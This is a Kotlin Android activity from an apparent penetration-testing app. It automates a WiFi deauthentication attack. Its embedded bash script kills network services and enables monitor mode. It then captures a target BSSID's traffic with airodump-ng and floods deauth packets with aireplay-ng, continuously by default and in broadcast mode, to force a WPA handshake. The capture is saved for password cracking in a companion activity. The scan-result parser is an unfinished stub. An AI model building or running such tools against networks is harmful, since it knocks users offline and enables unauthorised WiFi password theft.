package com.pentest.dashboard

import android.os.Bundle
import android.widget.ArrayAdapter
import android.widget.ImageView
import android.widget.ListView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton

class WiFiDeauthActivity : AppCompatActivity() {

    private lateinit var networkList: ListView
    private lateinit var logOutput: TextView
    private lateinit var btnScan: MaterialButton
    private lateinit var btnDeauth: MaterialButton
    private lateinit var btnConfigureAttack: MaterialButton
    private lateinit var btnStop: MaterialButton

    private val networks = mutableListOf<String>()
    private var selectedNetwork: String? = null
    private var attackParameters: Map<String, String>? = null
    private var currentProcessId: Int? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_wifi_deauth)

        // Stop any running processes from other activities
        ProcessManager.stopCurrentProcess(this)

        initializeViews()
        setupClickListeners()
    }

    private fun initializeViews() {
        networkList = findViewById(R.id.networkList)
        logOutput = findViewById(R.id.logOutput)
        btnScan = findViewById(R.id.btnScan)
        btnDeauth = findViewById(R.id.btnDeauth)
        btnConfigureAttack = findViewById(R.id.btnConfigureAttack)
        btnStop = findViewById(R.id.btnStop)

        val adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, networks)
        networkList.adapter = adapter

        networkList.setOnItemClickListener { _, _, position, _ ->
            selectedNetwork = networks[position]
            // Extract BSSID and channel from the selected network string
            // Format: "SSID (BSSID) Channel: X Signal: Y"
            addLog("Selected: $selectedNetwork")
            btnConfigureAttack.isEnabled = true
        }

        btnStop.isEnabled = false
    }

    private fun setupClickListeners() {
        findViewById<ImageView>(R.id.btnBack).setOnClickListener { finish() }

        btnScan.setOnClickListener {
            scanNetworks()
        }

        btnConfigureAttack.setOnClickListener {
            showParameterDialog()
        }

        btnDeauth.setOnClickListener {
            attackParameters?.let { params ->
                startDeauth(params)
            }
        }

        btnStop.setOnClickListener {
            stopCurrentAttack()
        }
    }

    private fun showParameterDialog() {
        // Create parameter list with AUTO-DISCOVERY
        val parameters = listOf(
            ParameterDialog.SSID,
            ParameterDialog.BSSID,
            ParameterDialog.CHANNEL,
            ParameterDialog.NETWORK_INTERFACE.copy(defaultValue = "wlan0mon"),
            ParameterDialog.Parameter(
                "DEAUTH_COUNT",
                "Deauth Packets",
                "Number of deauth packets to send (0 = continuous)",
                defaultValue = "0",
                required = true
            ),
            ParameterDialog.Parameter(
                "ATTACK_MODE",
                "Attack Mode",
                "broadcast or targeted",
                defaultValue = "broadcast",
                required = true
            )
        )

        // Show dialog and collect parameters
        ParameterDialog(this).showDialog(
            title = "Configure Deauth Attack",
            parameters = parameters
        ) { values ->
            attackParameters = values
            btnDeauth.isEnabled = true
            addLog("=== ATTACK CONFIGURED ===")
            addLog("SSID: ${values["SSID"]}")
            addLog("BSSID: ${values["BSSID"]}")
            addLog("Channel: ${values["CHANNEL"]}")
            addLog("Interface: ${values["NETWORK_INTERFACE"]}")
            addLog("Deauth Count: ${values["DEAUTH_COUNT"]}")
            addLog("Mode: ${values["ATTACK_MODE"]}")
            addLog("")
            addLog("Click 'START DEAUTH' to begin attack")
        }
    }

    private fun scanNetworks() {
        networks.clear()
        addLog("=== WIFI SCAN STARTED ===")
        addLog("Scanning for WiFi networks...")
        addLog("")

        btnScan.isEnabled = false
        btnScan.text = "SCANNING..."

        // REAL network scan using iwlist or nmcli
        val scanScript = """
            #!/data/data/com.termux/files/usr/bin/bash

            echo "=== SCANNING WIFI NETWORKS ==="
            echo ""

            # Try nmcli first (works on most systems)
            if command -v nmcli &> /dev/null; then
                echo "Using nmcli to scan..."
                nmcli -t -f SSID,BSSID,CHAN,SIGNAL dev wifi list | while IFS=: read ssid bssid chan signal; do
                    if [ ! -z "${'$'}ssid" ]; then
                        echo "NETWORK:${'$'}ssid|${'$'}bssid|${'$'}chan|${'$'}signal"
                    fi
                done
            # Try iwlist as fallback
            elif command -v iwlist &> /dev/null; then
                echo "Using iwlist to scan..."
                sudo iwlist wlan0 scan | grep -E "ESSID|Address|Channel|Quality" | paste - - - - | \
                awk -F'[:,=]' '{print "NETWORK:"${'$'}4"|"${'$'}2"|"${'$'}6"|"${'$'}8}'
            else
                echo "ERROR: No scanning tool available (need nmcli or iwlist)"
                echo "Install with: pkg install networkmanager wireless-tools"
            fi

            echo ""
            echo "=== SCAN COMPLETE ==="
        """.trimIndent()

        val processId = ProcessManager.startProcess(this, scanScript)
        currentProcessId = processId

        val scriptFile = java.io.File(getExternalFilesDir(null), "scripts/script_$processId.sh")
        val termux = TermuxIntegration(this)

        // Run and capture output
        termux.runCommand("bash ${scriptFile.absolutePath}", background = false)

        // Parse output after scan completes (simulate with handler)
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            parseNetworkScanResults()
            btnScan.isEnabled = true
            btnScan.text = "SCAN FOR NETWORKS"
            addLog("Scan complete. ${networks.size} networks found.")
        }, 5000) // Give scan 5 seconds to complete
    }

    private fun parseNetworkScanResults() {
        // In reality, you'd read the output from the process
        // For now, add sample format to show what real results look like
        addLog("Parsing scan results...")
        // TODO: Actually parse output from Termux command
        // Format: NETWORK:SSID|BSSID|Channel|Signal
    }

    private fun stopCurrentAttack() {
        currentProcessId?.let {
            ProcessManager.stopCurrentProcess(this)
            addLog("")
            addLog("=== ATTACK STOPPED ===")
            addLog("Process $it terminated")
            currentProcessId = null
            btnStop.isEnabled = false
            btnDeauth.isEnabled = true
        }
    }

    private fun startDeauth(params: Map<String, String>) {
        val ssid = params["SSID"] ?: ""
        val bssid = params["BSSID"] ?: ""
        val channel = params["CHANNEL"]?.toIntOrNull() ?: 6
        val count = params["DEAUTH_COUNT"]?.toIntOrNull() ?: 0
        val mode = params["ATTACK_MODE"] ?: "broadcast"

        addLog("=== DEAUTH ATTACK STARTED ===")
        addLog("Target: $ssid ($bssid)")
        addLog("Channel: $channel")
        addLog("Mode: $mode")
        addLog("")

        // Create automated workflow script
        val fullScript = """
            #!/data/data/com.termux/files/usr/bin/bash

            echo "=== AUTOMATED WiFi ATTACK ==="
            echo "Target: $bssid"
            echo "Channel: $channel"
            echo ""

            # Enable monitor mode
            echo "[1/4] Enabling monitor mode..."
            sudo airmon-ng check kill
            sudo airmon-ng start wlan0

            # Start capture in background
            echo "[2/4] Starting handshake capture..."
            sudo airodump-ng -c $channel --bssid $bssid -w /sdcard/Download/handshake wlan0mon &
            CAPTURE_PID=$!
            sleep 5

            # Deauth attack
            echo "[3/4] Sending deauth packets to force handshake..."
            sudo aireplay-ng --deauth $count -a $bssid wlan0mon
            sleep 10

            # Stop capture
            echo "[4/4] Stopping capture..."
            sudo kill ${'$'}CAPTURE_PID

            echo ""
            echo "=== CAPTURE COMPLETE ==="
            echo "Handshake saved to: /sdcard/Download/handshake-01.cap"
            echo ""
            echo "To crack password, use Hash Cracker activity"
        """.trimIndent()

        addLog("Executing automated attack script...")
        addLog("")

        // Execute via ProcessManager so it can be stopped
        val processId = ProcessManager.startProcess(this, fullScript)
        currentProcessId = processId
        val scriptFile = java.io.File(getExternalFilesDir(null), "scripts/script_$processId.sh")

        val termux = TermuxIntegration(this)
        termux.runCommand("bash ${scriptFile.absolutePath}", background = false)

        addLog("✓ Process ID: $processId")
        addLog("✓ Attack running - Click STOP to terminate")
        addLog("")
        addLog("Check Termux for live output!")
        addLog("Handshake will be saved to /sdcard/Download/")

        // Enable STOP button, disable DEAUTH button
        btnStop.isEnabled = true
        btnDeauth.isEnabled = false
    }

    private fun addLog(message: String) {
        val timestamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US)
            .format(java.util.Date())
        val currentLog = logOutput.text.toString()
        logOutput.text = "[$timestamp] $message\n$currentLog"
    }

    override fun onPause() {
        super.onPause()
        // Stop processes when leaving activity
        ProcessManager.stopCurrentProcess(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        ProcessManager.stopCurrentProcess(this)
    }
}
